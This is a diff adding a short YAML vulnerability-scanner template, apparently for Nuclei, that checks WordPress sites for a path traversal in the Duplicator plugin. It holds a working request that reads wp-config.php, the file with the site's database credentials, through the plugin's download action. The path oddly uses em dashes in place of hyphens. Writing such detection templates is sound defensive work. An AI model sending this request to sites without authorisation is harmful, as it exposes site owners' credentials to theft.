@@ -1,0 +1,14 @@
+http:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - DB_NAME
+  method: GET
+  path:
+  - "{{BaseURL}}/wp\u2014admin/admin\u2014ajax.php?action=duplicator_download&file=/../wp-config.php"
+id: wordpress-duplicator-path-traversal
+info:
+  author: madrobot
+  name: WordPress duplicator Path Traversal
+  severity: high
